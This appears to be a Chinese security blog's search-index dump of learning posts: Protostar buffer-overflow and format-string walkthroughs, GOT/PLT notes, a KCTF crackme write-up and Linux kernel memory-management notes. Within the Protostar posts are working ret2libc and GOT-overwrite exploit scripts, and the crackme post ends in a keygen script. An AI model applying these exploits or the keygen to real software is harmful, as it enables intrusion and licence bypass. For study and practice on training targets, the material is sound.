-4这种机制去设置chunk的大小 跳转指令的编写可以参考在线汇编器，不一定只使用jmp。这种语句的构造就和hook一样： push addr + ret mov eax, addr + call eax jmp addr 还有当跳转指令过长，可能会被从GOT表写入到堆里面的东西覆盖。这里可以采用在堆中多设置一些字符的方法来避免，就和堆喷时设置很多nop在前面一样 参考资料 LiveOverflow HomePage Prostar Exploit Education CSDN：什么是堆漏洞挖掘 dlmalloc Version 2.7.1pre1 2001 Online Assembler/Disassembler","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"http://cata1oc.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"缓冲区溢出入门(上)","slug":"缓冲区溢出入门-上","date":"2021-11-07T14:54:27.000Z","updated":"2022-05-17T15:53:30.018Z","comments":true,"path":"2021/11/07/缓冲区溢出入门-上/","link":"","permalink":"http://cata1oc.github.io/2021/11/07/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8-%E4%B8%8A/","excerpt":"","text":"前言在老大的推荐下，最近一段时间一直在学习 LiveOverflow 这个频道上的内容，基础篇主要通过Prostar Exploit Education上的练习介绍了常见的缓冲区溢出的利用手法，这里做个小结记录一下。 栈溢出原理利用具有漏洞的函数（例如一些不检查输入字符串大小的函数，常见的像gets，strcpy），写入任意长度的字符串，从而实现在指定地址（即栈中地址）写入任意数据，并最终达到影响程序执行流程的目的。 在Linux手册中查看函数的Bugs一栏，可以找到函数可能的利用点： 常见手法 修改局部变量 -> 改变执行流程 修改返回值 -> 跳转到指定地址执行 用指定函数的地址，覆盖[ebp+0x4]处的值（即函数返回时跳转的地址） 将Shellcode布置在栈中，并将返回地址修改为Shellcode起始处 Shellcode的构造：push参数，执行系统调用（例如通过int 0x80执行execve系统调用）。网上有一个Shellcodes Database可以作为参考，其中的Shellcode包含了主流的利用手法 Shellcode的布置：程序在不同设备运行时，栈的地址往往不同。为了栈中的Shellcode能够执行，通常会将Shellcode放入一个较深的位置（例如[ebp+0x60]），并在Shellcode之前布置足够多的nop（0x90）作为padding，当返回地址命中padding的任意位置时，CPU将会忽略，并执行位于nop之后的Shellcode ret2libc，准备好参数（同样位于程序中，通过搜索内存等方式获得），修改返回地址为libc库中的某个函数（通常为system），并通过该函数进行提权 实例题目源于Protostar的Stack6 题目中会校验返回地址是否在栈中，若在栈中就退出程序。所以这里不能往栈里跳了，本题用了ret2libc的手法进行提权，在开启了栈不可执行的情况下，通常会使用到此手法。以下为该题的exploit： python12345678import structpadding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'sys_addr = struct.pack('I', 0xb7ecffb0)ret = 'AAAA'bin_addr = struct.pack('I', 0xb7fb63bf) print(padding + sys_addr + ret + bin_addr) padding：就是填充用的 sys_addr：返回时的跳转地址，它覆盖了原先的返回地址。这里为此题中system的地址 bin_addr：函数system的参数。获取参数字符串的方法参考下图。（system的地址用类似的方法，不过需要自己先写一个调用system的Demo来找它在libc.so中的偏移。此方法仅限在未开启ASLR等安全机制的情况下使用） ret：这个函数这样理解，函数调用前，会先将参数压栈，再将返回地址压栈，然后再进入新的栈帧执行函数（push ebp…）。因此在一个函数开始执行时（即push ebp执行前），栈顶通常是返回地址 [ebp+0x4]，然后才是参数 [ebp+0x8/0xC…]。而当函数返回时，由于原本的返回地址被sys_addr覆盖，因而会直接进入sys_addr函数的首地址处。这里是没有参数压栈，返回值压栈的过程的。为了能让CPU看懂，因此这里设置好了一个值，假装是返回地址，然后才是参数。因此这里多了一个AAAA，说直白点，这么做就是为了平衡堆 格式化溢出原理利用printf的格式化漏洞。如下图所示，当执行像printf(foo)这样的语句时，若输入的foo包含%n，这将导致在printf执行时像内存（栈）中写入数据。 利用手法 指定地址，写入指定数据 往GOT里写入指定地址 单个字节（Byte）/单个字（Word）的写入 实例1本题为Protostar的Stack6 题目要求通过printf进行格式化字符串溢出，从而修改target的值，改变程序的执行流程。以下为解析过程： 图中没说明白的就是这个n%为什么这样用，这里可以参考StackOverFlow上的一个解答，如下图所示 简单来说，%n就是把格式化字符串中出现在%n之前的那部分字符串的长度，写入到一个地址中，这个地址会作为参数传入printf函数（注意，printf是个函数，它的参数也遵循所属调用约定的传参顺序，如上图所示，这里先传写入值的地址）。如果还不明白，就把上图中的程序反汇编看一下是怎样传参的，也就可以理解为啥像图中那样，需要先写入地址，将地址置于栈顶，然后再用%n写入。 不过注意一点，比起（基础）栈溢出，格式化字符串溢出可以做到向任意地址写入任意数据，因此还是有较大安全风险的。 实例2前一例子主要介绍%x和%n，分别用于查看泄漏的内存，以及如何向内存写入数据。这里则是关于如何写入，前面了解到%n是将该格式化字符之前的字符串的长度写入到地址中，那么如果需要将一个较大的值（例如0x080484b4）写入会怎样，那么难得要构造一个无比长的字符串吗？那显然是一件事很麻烦的事情，因此Protostar中的format4的解题就采用写入2个双字节或者4个单字节的方式替代。 首先是题目： 做这道题，核心思路是将函数hello的地址写入到exit的GOT表中（参考前一篇就能明白为什么要这么做） python1234567891011import structHELLO = 0x080484b4EXIT_PLT = 0x08049724addr_exit_low = struct.pack('I', EXIT_PLT)addr_exit_high = struct.pack('I', EXIT_PLT+2)format_write_low = '%4$33964x%4$n 'format_write_high = '%5$33615x%5$n'print(addr_exit_low + addr_exit_high + format_write_low + format_write_high) 直接看exploit，由于写入一个四字节的地址实在太大了，空间也可能不够，因此这里采用分别写入两个两字节的方式。这里比较关键的是对%4$33964x%4$n的理解，其中%和$之间是用来指定打印第几个数，如下图所示，如果是%4$1x则会打印橙色方框框出的值，而$和x之间则是指定打印出的数占的宽度（由于Protostar环境问题，没法完全演示），用于构造一个较大的空白字符，从而得到要写入的值。 通过这样的组合，就可以用一个%4$33964x指定写入的地址和一个%4$n用来写入指定的值。同理，在原先写入的地址加2的位置，以同样的方式再写入一次（这里写入时有一个高位补1的技巧），就能够写入完整的地址。单个字节的写入也是类似手法，只是构造每个字节写入的值时会有点麻烦。 参考资料 LiveOverflow HomePage Prostar Exploit Education Shellcodes Database StackOverFlow：What is the use of the n format specifier in c? Protostar Format3 Write-ups","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"http://cata1oc.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"初探GOT与PLT","slug":"初探GOT与PLT","date":"2021-10-31T14:13:16.000Z","updated":"2022-05-17T15:53:00.853Z","comments":true,"path":"2021/10/31/初探GOT与PLT/","link":"","permalink":"http://cata1oc.github.io/2021/10/31/%E5%88%9D%E6%8E%A2GOT%E4%B8%8EPLT/","excerpt":"","text":"前言之前看了个讲GOT和PLT的视频。看明白了，但没完全明白。所以，就把看明白的那部分，先整理成笔记写下来。以后全看明白了，再补充。 基础知识 .got GOT（Global Offset Table）全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。这里的外部符号当然也包含全局变量。 .plt PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在.got.plt节中拿到地址，并跳转。要么当.got.plt没有所需地址的时，触发「链接器」去找到所需地址 .got.plt 这个是 GOT 专门为 PLT 准备的节。说白了，.got.plt 是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）。功能类似 PE 的 IAT 表 .plt.got 不知道是干啥用的表 演示小程序c1234567int main(){ printf(\"Hello World\\n\"); printf(\"This is LiveOverflow\\n\"); exit(0); return 1;} gdb调试具体步骤参考下图，第一次调用printf（对应库函数puts），调用时在.got.plt中没找到函数地址，于是又回到了.plt，然后就调用了函数_dl_runtime_resolve，该函数位于ld.so，用于将共享库（例如libc.so）中的函数写入程序的.got.plt表中。 第二次调用printf时，可以看到.got.plt表里有函数地址，所以直接就跳转过去调用puts了。 参考链接 简书：彻底搞清楚 GOT 和 PLT LiveOverflow：GOT and PLT","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"http://cata1oc.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"KCTF题库：异想天开","slug":"KCTF题库-异想天开","date":"2021-10-22T14:28:20.000Z","updated":"2022-05-17T15:52:21.706Z","comments":true,"path":"2021/10/22/KCTF题库-异想天开/","link":"","permalink":"http://cata1oc.github.io/2021/10/22/KCTF%E9%A2%98%E5%BA%93-%E5%BC%82%E6%83%B3%E5%A4%A9%E5%BC%80/","excerpt":"","text":"前言原本想着，在博客记录下做的每一道CTF题，懒癌，一直没有行动；但这题就不一样了，自认为还是有一定难度的，有一定启发性的，所以得抓紧记录下来，不然就忘记思路了。这题最初是上周五（2021.10.15）做的，当时没做出来，回家后又和萌萌哒研究了1小时，还是没头绪（这里有个插曲，萌萌哒发现很多时候我不会用工具，并给了一些指点）。就看了高博（他做出来了）给的算法入口点，然后周日简单写了一个wp，周一做了一个通用的注册机，今天（已经周四了。。。）抽点时间来完成这篇博客吧。 之所以这题花费这么多时间，其实是一直没有定位到算法处，早定位到，就早做出来了，算法本身并不难。而这个定位的过程，正是这一道题的难度所在。这里，就来解析一下这道题。 踩坑流程找入口点找入口点花了我差不多90min，就是这样，我花了整整90min都没有找到入口点，当然，最终花了一整天都没找到算法入口点。就像我在HiSuite.exe中找了几个月，都没找到验证码校验的地方一样。最终，中午前，高博告诉我，入口点为0x401840，他是通过CreateDialogParamA回溯到的（实际上也可以通过SetDlgItemTextA）。下午，我通过GetWindowTextA也回溯到了sub_401840（通过这个函数回溯，也是导致我踩到巨坑上的一个主要因素）。这里呢，简单概括一下回溯的过程： 该CrackMe程序的入口点都是0x400000，这样就不需要在IDA里面Rebase Program Segment，两者在主程序中的地址是一致的。下面开始回溯，在GetWindowTextA下断，点击确定，断下，栈中看到，由地址0x41DC22调用 IDA中找到0x41DC22，所在函数为DDX_Text，通过交叉引用，发现其在sub_401440中被调用 进入，sub_401440，交叉引用，发现地址位于.rodata。遂进入OD，在0x401440处下断，重新执行程序，右下角栈中可以看到sub_401440的返回处为0x41A7A5 找到0x41A7A5，发现sub_401440是通过寄存器+偏移来寻址并调用的，此次调用发生在函数sub_41A750中 再用同样的方法在OD中回溯，就可以找到是在函数sub_401840中调用了sub_401750 找算法入口 找到sub_401840后，先F5，打算分析算法（当然，算法并不在这）。先定位到黄色方框，这里我在经过OD分析后，已经将变量重命名了，显然这里的作用就是对输入的用户名和注册码做一个长度校验，若长度不符合，则会将v4的值设置为this+100处的值，然后跳转。一会来看this+100处存的是什么。再往下看，如果能够通过黄色方框的校验，就会来到LABEL_11，这部分最像算法的，就是红框方框里面的内容了。但显然不是，高博比我提前一个多小时定位到sub_401840，若这里就是获取flag的算法，他早就做出来了。 在OD中断到0x40185E，然后执行一下对sub_41A750的调用，观察堆栈变化，可以看到栈中有了输入的用户名和注册码；并且先前在利用GetWindowTextA进行回溯时也是从这里出来的。因此，可以推测sub_41A750通过调用GetWindowTextA获取到输入的用户名和注册码，再将其放入栈中的某个位置。 而这个栈中的位置是什么呢？观察下图，先看OD，mov eax, [esi+0x80]，可以获得到“CTFHUB”，正是输入的用户名，结合左边IDA中的伪代码，就可以推出esi即this。这样就可以得出下表中的结论： 伪代码 对应的值 this + 128 输入的用户名 this + 124 输入的注册码 this + 120 未注册 this + 116 注册码不能为空 this + 112 用户名不能为空 this + 100 很遗憾！你输入的注册码不正确 this + 96 恭喜：你已经注册成功。简单吧？ this + 92 zouzhiyong-zouzhiyong 有了这张表格，就能更容易看明白左图这张IDA的伪代码，在获取了值以后，需要先保证输入用户名的长度大于等于5，且输入注册码的长度大于等于19，这样才会执行的LABEL_11，即一个看上去有着flag算法逻辑的地方。 这里来看下LABEL_11的逻辑，很显然，如果存在flag的运算，那肯定就是黄色方框的部分了。再往后看，红色方框有一个校验。判断字符串Str1的值，与this+92（即字符串zouzhiyong-zouzhiyong）的值是否相等。如果相等，那v9的值会被设置为this+96，看似这样就能成功了。那再去看Str1的值哪来，如果说黄色方框是进行flag运算的部分，那么它是通过this+92这个字符串进行运算的。但这样问题也就来了，在对该字符串进行如下的一串运算后，再和自身进行比较，若一致，则能成功。显然，这里不可能成功。因为经过黄色方框中的运算，字符串不可能还会是原先的字符串了。我曾在这里卡壳了很久，认为通过计算出一个经过黄色方框中运算，能够得到字符串”zouzhiyong-zouzhiyong“的原始字符串，很显然，我怎么都无法获取到0x7E以上的字符，更何况，这里根本就没有用输入的注册码进行计算，而是用一个内置的字符串进行运算后再与自身比较，所以我被坑了。因此结论很明显了，那就是根本不能进入这个黄色方框的if语句，一旦进来了，那就已经无法通过校验了。 之后就一直在sub_401840中徘徊，进去看了该函数中的所有函数调用，都没有看着像算法实现的地方，始终无法找到计算flag的位置处，甚至一度怀疑是入口点找错了，根本不在sub_401840。后来看了高博给我的flag算法所在的函数，我从此处开始回溯，确实回溯到了sub_401840，也发现了问题所在。 解法 真正的问题其实就在sub_401750中，由于我一开始找入口点是通过GetWindowTextA回溯的，也途径了sub_401750。因此就默认sub_401750是一个初始化this成员的函数，但实际上并不仅仅如此。在sub_401750中有一个不确定的点，就是call dword ptr [eax+0x84]这条调用指令，该调用采用了寄存器+偏移的方式寻址，这意味着，如果sub_401750被多次调用，每次执行到这里时，所调用的函数是不确定的。而恰好，这个sub_401750确实有被多次调用，且每次执行到这时调用的函数并不一样，而之前在利用GetWindowTextA进行回溯时，也仅仅从函数sub_401440回溯过来，即下图的第一种情况，也因此，忽略了。而在这里下断，会断下了3次（实际上是4次，但是第1次是在执行sub_401840之前）。这样也就有额外的两个函数需要分析，即sub_401E80和sub_401AB0 先来看sub_401E80，这里就直接把该函数的各个调用的伪代码贴一下，显然，该函数及其子函数是没有flag算法实现的 接着看sub_401AB0，很明显sub_419413的部分并没有flag的算法实现，但是要注意，这里也调用了GetWindowTextA，该API也被多次调用，但是我在回溯时，也只回溯到了第一次调用的时候，因此最终回溯到了sub_401840而不是sub_419413。 再看sub_401AE0，这里面内容很多，实际上flag的算法就在这个函数里面。这里我就不详细分析了，总体难度不大。它分为两步，首先是将字符串“zouzhiyong-zouzhiyong”与输入的字符串（本题为”CTFHUB“）进行一个运算，得到一个新的字符串（本题得到新字符串为“yggz-iiiz-uggo-uzoy-zyih”，该字符串可以直接在内存中获得，因而有些人的wp非常简单，但不通用），这个得到字符串的过程还是有点意思的，它有一个ascii求值的循环，前3次求和用的字符串分别是CTFHUB、TTFHU，FTFH，自己找规律哈哈。得到字符串之后，接下来会调用sub_401C80实现一个简单的转换，就可以得到最终的flag了，sub_401C80中的运算过程更简单，就不分析了。 最后附上写好的一个writeup，唯一限制主要是只能支持长度为6位的用户名，不过感觉差不多了，也不想进一步完善了 python123456789101112131415161718192021222324252627282930313233343536373839404142434445s1 = 'CTFHUB's2 = 'zouzhiyong-zouzhiyong's3 = []str_pos = 0while str_pos < 5: # 每次循环后，会从s2中获取到4个字符，它们之间需用'-'隔开 if str_pos != 0: s3.append('-') # 这一步计算出此轮循环对s2进行变换时，所需的s1的部分字符串 temp_s = s1[str_pos] + s1[1:6-str_pos] # 利用前一步得到s1算出其ascii值的和，用于对s2进行变换，并 # 将变换后s2存储到s3中 sum_s = 0 for x in temp_s: sum_s = sum_s + ord(x) while sum_s < 10000: sum_s = sum_s * 3 sum_s = sum_s // 3 while sum_s != 0: i = sum_s % 10 sum_s = (sum_s - sum_s%10) // 10 s3.append(s2[i]) str_pos = str_pos + 1s3 = ''.join(s3)# 利用s3计算出最后的flagres = []for x in s3: if ord(x) == 45: res.append(x) else: temp = ord(x) - ord(x)%5 - 20 - 12 - ord(x)%2 res.append(chr(temp))print(''.join(res)) 总结 猜测可能调用的API并下断，来回溯到函数的入口点是一个值得采取的手段。直接通过winMain去跟，可能很难跟到。用API进行回溯更容易找到某些逻辑的执行处，而通过对堆中数据下内存断点进行回溯则容易死在框架里。 多利用工具，例如IDA伪代码中的Tab键，或者Synchronize with -> IDA-View，可以将伪代码和汇编联系起来（感谢萌萌哒的指导）。以及最近认识到的OD中的插件OllyDump（Dump内存），SharpOD（过Vmp自带的反调试） 进行回溯时，需要了解某个函数的所有交叉调用关系，这点在IDA中用X快捷键可以看的更清晰。而在OD中，从某个API的回溯，往往只能看到某一次调用的过程，从而容易忽略该API在其它地方可能也被调用。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://cata1oc.github.io/tags/CTF/"},{"name":"Windows逆向","slug":"Windows逆向","permalink":"http://cata1oc.github.io/tags/Windows%E9%80%86%E5%90%91/"}]},{"title":"《Linux内核源代码情景分析》笔记","slug":"Linux内核源代码情景分析读书笔记","date":"2021-07-01T16:21:42.000Z","updated":"2022-05-17T15:51:49.668Z","comments":true,"path":"2021/07/02/Linux内核源代码情景分析读书笔记/","link":"","permalink":"http://cata1oc.github.io/2021/07/02/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E4%BB%A3%E7%A0%81%E6%83%85%E6%99%AF%E5%88%86%E6%9E%90%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/","excerpt":"","text":"前言原计划在7月份写一些与Linux内核相关的博客，6月份就都在看这方面的书了，问轩辕大哥要了份资源，其中一本就是毛德操老师的《Linux内核源代码情景分析》，在学习 Windows 内核时就曾久仰毛德操老师的大名，这本书确实不错，但在读完存储管理这一章后，我就放弃了，内容非常深入，但不结合代码一点点看，显然是读不明白的，另一方面，鉴于这是2001年就出版的基于2.4版本的 Linux 内核的书，属实有些旧了。同样经典的 ULK，LDD 以及红宝书，均是基于2.6版本 Linux 内核。 经过一个周末的筛选，接下来会选择红宝书（3本书中翻译的较为好的一本，另外2本不想去看英文原版）作为主要资料进行学习。并会从7月初开始，根据所学进度逐步更新 Linux 内核知识点。 本篇主要是先前阅读《Linux内核源代码情景分析》时记录下的我认为比较重要或者构思巧妙的点（主要是存储管理这一章节的内容）。 笔记耐人寻味的do-while参考P17~18，这个宏操作为什么要通过一个do-while循环来定义呢？ #define DUMP_WRITE(addr,nr) do { memcpy(bufp,addr,nr); bufp += nr; } while(0) 绕人的宿主结构体参考P21中rmqueue()的例子，如何通过结构体中的字段，算出宿主结构体的地址。 ((type *)((char *)(ptr)-(unsigned long)(&((type *)0)->member))) Ubuntu的常规工具 gcc：编译 objdump：反汇编 LDT的设计初衷参考P37，Intel的设计意图是内核用GDT而各个进程都用其自己的LDT。但实际上，不光Windows内核不用LDT，Linux内核也不怎么用（除了运行wine或其它模拟运行Windows软件时才使用）。 Linux中的段寄存器参考P38，虽然Intel的意图是将一个进程的映像分成代码段、数据段和堆栈段，Linux内核却并不买这个帐。在Linux内核中堆栈段和数据段是不分的。 卑微的段式保护机制参考P40，要不是 i386 CPU中的 MMU 规定先作段式映射，然后才可以作页式映射，那就根本不需要段描述符和段寄存器了。所以，这里 Linux 内核只不过是装模做样地糊弄 i386 CPU，对付其检查比对而已。 段式存储管理的特殊系统调用参考P43，modify_ldt(int func, void \\*ptr, unsigned bytecount)，用来实现WINE（WINdows Emulation）的系统调用，可以改变当前进程的局部段描述符表，也就有办法侵犯到其它进程或内核的空间中去。一方面它确实是在内存管理机制上开了一个小小的缺口，但另一方面它的背后仍然是 Linux 内核的页式存储管理，只要不让用户进程掌握修改页面目录和页面表的手段，系统就还是安全的。 Linux中对页的管理参考P45~49，内核中有个全局变量 mem_map，是一个指针，指向一个 page 数据结构的数组（物理页面的仓库），每个 page 数据结构代表着一个物理页面，整个数组就代表着系统中的全部物理页面。这个 mem_map 相当于 Windows 系统中一个记录所有物理页信息的全局数组的指针 MmPfnDatabase。 ”仓库“中有管理区（常规的2个管理区：ZONE_DMA, ZONE_NORAML；用于物理地址超过 1GB 存储空间的管理区：ZONE_HIGHMEM）的概念，不同于 Windows 中的空闲页与活动状态页。 物理空间的均匀性参考P49，均质存储结构（Uniform Memory Architecture），是一种理想化的物理空间结构，即CPU访问这个空间中的任何一个地址所需的时间都相同。随着非均质存储结构的引入（Non-Uniform Memory Architecture）物理页面管理机制也作了相应的修正。管理区不再是属于最高层的机构，而是在每个存储节点中都有至少两个管理区。而且 page 结构数组（mem_map）也不再是全局性的，而是从属于具体的节点了。从而，在 zone_struct 结构（以及 page 结构数组）之上又有了另一层代表着存储节点的 pglist_data 数据结构。 Linux中的映射内存参考P52，有两种情况下虚存页面会跟磁盘文件发生关系。一种是盘区交换（swap），参考缺页异常的处理流程。另一种情况则是将一个磁盘文件映射到一个进程的用户空间中。Linux 提供了一个系统调用 mmap()，使一个进程可以将一个已经打开的文件映射到其用户空间中，此后就可以像访问内存中一个字符数组那样来访问这个文件的内容，而不必通过 leek()、read() 或 write() 等进行文件操作。这部分内容类似 Windows 中的映射内存。 Linux虚拟内存管理中数据结构间的联系参考2.3 几个重要的数据结构和函数。这一节介绍了多个数据结构，mm_struct 和 vm_area_struct 说明了（进程）对页面的需求；page、zone_struct 等结构则说明了（物理内存）对页面的供应；而页面目录、中间目录以及页面表则是二者中间的桥梁。其关系如下所示： 页式存储管理机制下的越界访问参考2.4节 越界访问P57~P60，这一节简略的分析了 Linux 系统中对缺页异常的处理函数 do_page_fault 的执行流程，里面提到了一个 task_struct 结构，它是描述进程的数据结构，从它可以修改线程的 Cr2 的值来看，task_struct 结构有点类似 Windows 内核中的 EProcess 或 KProcess 结构体。 P59，提到关于 Linux 中越界的一个定义：回忆一下内核对用户虚存空间的使用，堆栈在用户区的顶部，从上向下伸展，而进程的代码和数据都是自底向上分配空间。如果没有一个区间的结束地址高于给定的地址，那就是说明这个地址是在堆栈之上，也就是 3G 字节以上。要从用户空间访问属于系统的空间，那当然是越界了。 同样是P59，关于空洞。在用户虚存空间中，可能有两种不同的空洞。第一种是堆栈区以下的那个大空洞，它代表着供动态分配（通过系统调用 brk() ）而仍未分配出去的空间；第二种我的理解就是缺页异常时，页内容被换出去，P=0，但PTE不为空的那种情况。在2.5节 用户堆栈的扩展这一节中，有对第一种情况异常处理的分析。 页面增长量计算参考P62，当发生缺页异常，原因是进程堆栈空间不足时（属于正常的堆栈扩展要求情况下），需要扩充堆栈。首先将地址按页面边界对齐，并计算需要增长几个页面才能把给定的地址包括进去（通常是一个）。这里的代码逻辑我很喜欢，特此记录下来： grow = (vma->vm_start - address) >> PAGE_SHIFT; 文件操作函数表中的内存分配函数参考P66，在虚存区间结构 vm_area_struct 中有个指针 vm_ops，指向一个 vm_operations_struct 数据结构。这个数据结构实际上是一个函数跳转表，结构中通常是一些与文件操作有关的函数指针。其中有一个函数指针就是用于物理内存页面的分配。在这一节中，还涉及到对写保护部分代码实现的分析。 中断与异常的返回参考P69，中断返回后，会从下一条指令开始执行；异常返回后，会重新执行导致异常的那条指令。 2.1~2.5小结参考P70，在系统的初始化阶段，内核根据检测到的物理内存的大小，为每一个页面都建立一个 page 结构，形成一个 page 结构的数组，并使一个全局变量 mem_map 指向这个数组。同时，又按需要将这些页面拼合成物理地址连续的许多内存页面”块“，再根据块的大小建立起若干”管理区“（zone），而在每个管理区中则设置一个空闲块队列，以便物理内存页面的分配使用。 Linux内核对内存页面和盘上页面的管理参考P70~73： swap_info_struct：内核中定义的数据结构，用以描述和管理用于页面交换的文件或设备。 swap_map：指针，指向一个无符号短型数组；值代表盘上（或普通文件中）的一个物理页面，下标决定了该页面在盘上或文件中的位置。 swap_map[0]：所代表的页面不用于页面交换，它包含了该设备或文件自身的一些信息以及一个表明哪些页面可供使用的位图。 lowest_bit&highest_bit：供页面交换使用的范围区间。 max：该设备或文件中最大的页面号，即物理大小。 swap_info：swap_info_struct 结构的数组。 swap_list：将各个可以分配物理页面的磁盘设备或文件的 swap_info_struct 结构按优先级高低链接在一起。 swp_entry_t：类似 pte_t offset：表示在一个磁盘设备或文件中的位置 type：指该页面在哪一个文件中，是个序号 0：相当于 pte_t 的最低位 P 标志。指明页面不在内存，在磁盘上。 内存页面的周转参考P74，并非所有的内存页面都是可以交换出去的。事实上，只有映射到用户空间的页面才会被换出，而内核，即系统空间的页面则不在此列。 物理内存页面换入/换出的周转要点参考P76： 空闲。页面的 page 数据结构通过其队列头结构 list 链入某个页面管理区（zone）的空闲区队列 free_area。页面的使用计数 count 为0 分配。通过函数 _alloc_page() 或 __get_free_page() 从某个空闲队列中分配内存页面，并将所分配页面的使用计数 count 置成1，其 page 数据结构的队列头 list 结构则变成空闲。 活跃状态。页面的 page 数据结构通过其队列头结构 LRU 链入活跃页面队列 active_list，并且至少有一个进程的（用户空间）页面表项指向该页面。每当为页面建立或恢复映射时，都使页面的使用计数 count 加1。 不活跃状态（脏）。页面的 page 数据结构通过其队列头结构 LRU 链入不活跃 ”脏“ 页面队列 inactive_dirty_list，但是原则上不再有任何进程的页面表项指向该页面。每当断开页面的映射时都使页面的使用计数 count 减1。 将不活跃 ”脏“ 页面的内容写入交换设备，并将页面的 page 数据结构从不活跃 “脏” 页面队列 inactive_dirty_list 转移到某个不活跃 “干净” 页面队列中。 不活跃状态（干净）。页面的 page 数据结构通过其队列头结构 LRU 链入某个不活跃 “干净” 页面队列，每个页面管理区都有一个不活跃 “干净” 页面队列 inactive_clean_list。 如果在转入不活跃状态以后的一段时间内页面受到访问，则又转入活跃状态并恢复映射。 当有需要时，就从 “干净” 页面队列中回收页面，或退回到空闲队列中，或直接另行分配。 物理内存页面换入/换出的周转实现参考P77，为了实现这种策略，在 page 数据结构中设置了所需的各种成分，并在内核中设置了全局性的 active_list 和 inactive_dirty_list 两个 LRU 队列，还在每个页面管理区中设置了一个 inactive_clean_list。根据页面的 page 结构在这些 LRU 队列中的位置，就可以知道这个页面转入不活跃状态后时间的长短，为回收页面提供参考。同时，还通过一个全局的 address_space 数据结构 swapper_space，把所有可交换内存页面管理起来，每个可交换内存页面的 page 数据结构都通过其队列列头结构 list 链入其中的一个队列。此外，为加快在暂存队列中的搜索，又设置了一个哈希表 page_hash_table。 P78~80，通过分析 add_to_swap_cache() 的执行流程，介绍了内核是如何将一个内存页面链入上述队列的。不过该函数具体实现，还是和上述描述有些差别。 多重身份的address_sapce参考P79，通常来自同一个文件的页面就通过一个 address_space 数据结构来管理，而代表着一个文件的 inode 数据结构中有个成分 i_data，那就是一个 address_space 数据结构。从这个意义上说，用来管理可交换页面的 address_space 数据结构 swapper_space 只是个特例。 连续空间与不连续空间的alloc_pages()参考P82。可见，参数 gfp_mask 在这里用作给定节点中数组 node_zonelists[]的下标，决定具体的分配策略。在连续空间 UMA 结构中只有一个节点 contig_pape_data，而在 NUMA 结构或不连续空间 UMA 结构中则有多个。 kswapd参考P93，Linux 内核中设置了一个专司定期将页面换出的 “守护神” kswapd。从原理上说，kswapd 相当于一个进程，有其自身的进程控制块 task_struct 结构，跟其它进程一样受内核的调度。而正因为内核将它按进程来调度，就可以让它在系统相对空闲的时候来运行。不过，与普通的进程相比，kswapd 还是有其特殊性。首先，它没有自己独立的地址空间，所以在近代操作系统理论中称为 “线程” （thread）以示区别。那么，kswapd 使用谁的地址空间呢？它使用的是内核的空间。在这一点上，它与中断服务程序相似。其次，它的代码是静态地连接在内核中的，可以直接调用内核中的各种子程序，而不像普通的进程那样只能通过系统调用，使用预先定义好的一组功能。 kernel_thread()参考P94，kernel_thread() 用来创建线程，例如 kswapd 和 kreclaimd 这两个线程： c12kernel_thread(kswapd, NULL, CLONE_FS | CLONE_FILES | CLONE_SIGNAL);kernel_thread(kreclaimd, NULL, CLONE_FS | CLONE_FILES | CLONE_SIGNAL); kswapd() 每秒一次的例行路线会做些什么？参考P97： 预先找出若干页面，且将这些页面的映射断开，使这些物理页面从活跃状态转入不活跃状态，为页面的换出作好准备。该功能只有在发现物理页面出现短缺时才会执行。 把已经处于不活跃状态的 “脏” 页面写入交换设备，使它们成为不活跃 “干净” 页面继续缓冲，或进一步回收一些这样的页面成为空闲页面。这个功能每次都会执行。 系统可供分配或周转的物理页面检查参考P97，系统中应该维持的物理页面供应量由两个全局变量确定，freepages.high 和 inactive_target，分别为空闲页面的数量和不活跃页面的数量，二者之和为正常情况下潜在的供应链。这些内存页面的来源有3个方面： nr_fress_pages() 统计的空闲页面，分散在各个页面管理区中，合并成地址连续的页面块形式存在。 nr_inactive_clean_pages() 统计的不活跃 “干净” 页面，也分散在各个页面管理区中，但不合并成块。 由内核中的一个全局变量队列 nr_inactive_dirty_pages 统计的不活跃的 “脏” 页面，使用前要先将内容写入交换设备。 内核对进程虚存空间的管理参考P164，那么，内核怎样管理每个进程的 3G 字节虚存空间呢？粗略的说，用户程序经过编译、连接形成的映像文件中有一个代码段和一个数据段（包括 data 段和 bss 段），其中代码段在下，数据段在上。数据段中包含了所有静态分配的数据空间，包括全局变量和说明为 static 的局部变量。这些空间是进程所必须的基本要求，所以内核在建立一个进程的运行映像时就分配好这些空间，包括虚存地址空间和物理页面，并建立好二者间的映射。除此之外，堆栈使用的空间也属于基本要求，所以也是在建立进程时就分配好的（但可以扩充）。所不同的是，堆栈空间安置在虚存空间的顶部，运行时由顶向下延申；代码段和数据段则在底部，在运行时并不向上伸展。而从数据段的顶部 end_data 到堆栈段地址的下沿这个中间区域则是一个巨大的空洞，这就是可以在运行时动态分配的空间。最初，这个动态分配空间是从进程的 end_data 开始的，这个地址为内核和进程所共知。以后，每次动态分配一块 